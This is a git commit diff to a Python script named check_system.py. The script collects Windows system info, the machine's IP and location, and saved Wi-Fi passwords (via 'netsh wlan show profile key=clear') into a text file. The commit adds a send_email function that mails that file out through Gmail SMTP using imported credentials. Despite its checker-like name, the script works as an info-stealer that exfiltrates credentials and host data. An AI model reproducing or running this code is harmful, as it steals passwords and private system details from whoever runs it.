2c14bc007b8fc80627d430749bd9bd7ce66ffcc5
Maksym <kkamera317@gmail.com>
2022-02-01 00:29:56 +0200

    add smtplib

--- check_system.py
+++ check_system.py
@@ -1,6 +1,12 @@
 import subprocess
 import requests
 from bs4 import BeautifulSoup
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from auth_data import passw, mail
+
 
 def system_info() :
     system_data = subprocess.check_output('systeminfo').decode('CP866')
@@ -19,7 +25,6 @@ def ports_info() :
 def check_ip() :
     ip_data = subprocess.check_output('nslookup myip.opendns.com. resolver1.opendns.com').decode('CP866').split('\n')
     ip_dns = [i.split(' : ')[0].strip() for i in ip_data if 'Address' in i][1]
-
     url = 'https://2ip.ru/'
     response = requests.get(url)
     soup = BeautifulSoup(response.text, 'lxml')
@@ -30,12 +35,12 @@ def check_ip() :
     with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
         file.write(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
 
+
 def check_wifi():
     profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split("\n")
     profiles = [i.split(" : ")[1].strip() for i in profiles_data if 'All User Profile' in i or 'Все профили пользователей' in i]
     for profile in profiles :
         profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('CP866').split('\n')
-
         try :
             password = [i.split(' : ')[1].strip() for i in profile_info if 'Key Content' in i or 'Содержимое ключа' in i][0]
         except IndexError :
@@ -45,11 +50,33 @@ def check_wifi():
             file.write(f'\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
 
 
+def send_email() :
+    attachment = "check_system.txt"
+    msg = MIMEMultipart()
+    msg['Subject'] = "Report"
+    msg['From'] = mail
+    msg['To'] = mail
+    part = MIMEBase('application', "octet-stream")
+    part.set_payload(open(attachment, "rb").read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment', filename=attachment)
+    msg.attach(part)
+    with smtplib.SMTP('smtp.gmail.com',587) as server:
+       server.ehlo()
+       server.starttls()
+       server.ehlo()
+       server.login(mail, passw)
+       server.send_message(msg)
+       server.quit()
+
+
 def main():
-    check_ip()
-    system_info()
-    ports_info()
-    check_wifi()
+    #check_ip()
+    #system_info()
+    #ports_info()
+    #check_wifi()
+    send_email()
+
 
 if __name__ =="__main__" :
     main()
